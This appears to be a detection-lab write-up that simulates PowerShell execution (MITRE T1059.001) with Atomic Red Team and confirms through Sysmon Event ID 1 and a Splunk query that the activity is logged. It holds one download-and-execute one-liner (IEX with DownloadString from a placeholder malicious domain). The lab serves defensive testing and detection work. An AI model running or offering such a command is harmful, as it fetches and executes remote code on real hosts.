# T1059.001 – PowerShell Execution

**MITRE Technique**: [T1059.001 – Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)

This attack simulates malicious PowerShell execution using Atomic Red Team on a domain-joined Windows 10 machine. The purpose is to test endpoint visibility using Sysmon and log detection with Splunk.

---

## 🎯 Objective

* Simulate a real-world PowerShell-based attack
* Confirm Sysmon logs command line activity (Event ID 1)
* Verify detection in Splunk via search queries

---

## 🧪 Atomic Command Used

```powershell
powershell.exe -nop -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]domain/script.ps1')"
```

This PowerShell command reflects a common technique used by attackers to download and execute remote code.

## 🔍 Detection in Splunk

### Tools Involved:

* Sysmon installed on Windows 10
* Splunk Universal Forwarder running on the same host
* Splunk Enterprise server receiving and indexing logs
* Atomic Red Team running directly on the Windows target

### Detection Method:

* Sysmon Event ID 1 logs all process creations, including full PowerShell command lines
* Splunk ingests these logs under sourcetype `WinEventLog:Microsoft-Windows-Sysmon/Operational`

### Splunk Detection Query:

```splunk
index=endpoint sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| search CommandLine="*powershell*"
| table _time, Computer, User, CommandLine
```

### What to Look For:

* Suspicious PowerShell usage
* Base64 encoded or obfuscated strings
* Unexpected external IPs or domains

> 🔎 **Correlating with Event ID 4624**:
> Logon Event ID 4624 is useful to confirm which user account initiated the session during which the suspicious PowerShell was executed. By cross-referencing this with Event ID 1 from Sysmon, analysts can gain timeline context and user attribution.

---

## ✅ Result

* PowerShell execution logged by Sysmon (Event ID 1)
* Event successfully forwarded to Splunk
* Detection via query confirmed visibility
